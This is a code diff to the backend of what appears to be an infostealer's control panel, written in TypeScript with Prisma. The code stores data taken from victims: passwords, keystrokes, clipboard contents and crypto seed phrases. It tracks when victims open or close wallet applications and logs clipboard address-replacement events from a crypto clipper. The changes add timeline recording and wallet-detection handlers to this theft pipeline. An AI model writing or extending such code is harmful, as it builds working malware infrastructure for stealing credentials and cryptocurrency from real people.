@@ -3,6 +3,8 @@ import { prisma } from './db';
 import { publish } from './bus';
 import { notify } from '../services/notify';
 import { upsertSecrets } from '../services/vault';
+import { recordEntry } from './timeline';
+import { closed as walletClosed, detected as walletDetected } from './wallet-detection';
 
 export type EventInput = { kind: string; data: Record<string, unknown>; legacy: string };
 
@@ -28,7 +30,7 @@ async function recordPassword(victimId: string, process: string, title: string, 
 }
 
 /** Clipboard floods collapse onto one row per kind+content inside a minute. */
-async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null): Promise<void> {
+async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null, process = '', title = ''): Promise<void> {
   const since = new Date(Date.now() - 60_000);
   const existing = content
     ? await prisma.clipboardEntry.findFirst({
@@ -43,7 +45,7 @@ async function recordClipboard(victimId: string, kind: string, content: string, 
     }).catch(() => undefined);
     return;
   }
-  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content, kind, replaced } });
+  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process, window: title, content, kind, replaced } });
 }
 
 /** Persist a structured event and mirror it onto the typed tables. */
@@ -72,29 +74,46 @@ export async function applyEvent(victimId: string, event: EventInput): Promise<v
         data: { data: { ...previous, ...safeData, hash, count, lastSeenAt: new Date().toISOString() } as never }
       });
       await storeSecret(victimId, kind, data, value);
-      void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...safeData, hash, count, legacy: event.legacy } });
+      void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...safeData, kind, hash, count, legacy: event.legacy } });
       return;
     }
     const created = await prisma.event.create({
       data: { victimId, kind, data: { ...safeData, hash, count: 1 } as never, legacy: event.legacy }
     });
     await storeSecret(victimId, kind, data, value);
-    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...safeData, hash, count: 1, id: created.id, legacy: event.legacy } });
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...safeData, kind, hash, count: 1, id: created.id, legacy: event.legacy } });
   } else {
     await prisma.event.create({ data: { victimId, kind, data: data as never, legacy: event.legacy } });
-    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, legacy: event.legacy } });
+    // `kind` goes last: a clipboard subtype in data must not overwrite the event kind.
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...data, kind, legacy: event.legacy } });
   }
 
+  if (kind === 'keystroke' || kind === 'clipboard') {
+    await recordEntry(victimId, kind, data, event.legacy);
+    if (kind === 'clipboard') {
+      await recordClipboard(victimId, text(data.kind, 32) || 'text', value || text(data.content, 200_000), null, text(data.process, 260), text(data.title, 512));
+    }
+  }
+  if (kind === 'wallet_detected') {
+    await walletDetected(victimId, { name: String(data.name ?? data.text ?? ''), pid: Number(data.pid) || null, title: typeof data.title === 'string' ? data.title : null, text: typeof data.text === 'string' ? data.text : null });
+  } else if (kind === 'wallet_closed') {
+    await walletClosed(victimId, { pid: Number(data.pid) || null, title: typeof data.title === 'string' ? data.title : null });
+  }
   if (kind === 'password') {
+    await recordEntry(victimId, 'keystroke', { text: data.text, process: data.process, title: data.title }, event.legacy);
     await recordPassword(victimId, text(data.process, 260), text(data.title, 512), text(data.text, 4096) || event.legacy);
   } else if (kind === 'clipboard_secret') {
+    await recordEntry(victimId, 'clipboard', { content: value, kind: data.kind, process: data.process, title: data.title }, event.legacy);
     if (value && String(data.kind ?? '').startsWith('seed')) {
       await storeSecret(victimId, 'seed_found', data, value);
       await seedFound(victimId, value);
     }
   } else if (kind === 'clipboard_replace') {
     const original = text(data.original, 256);
-    if (original) await recordClipboard(victimId, text(data.coin, 16) || 'replace', original, text(data.replacement, 256) || null);
+    if (original) {
+      await recordEntry(victimId, 'clipboard', { content: original, kind: text(data.coin, 16) || 'replace', process: 'clipboard', title: text(data.replacement, 256) }, event.legacy);
+      await recordClipboard(victimId, text(data.coin, 16) || 'replace', original, text(data.replacement, 256) || null);
+    }
   }
 }
 
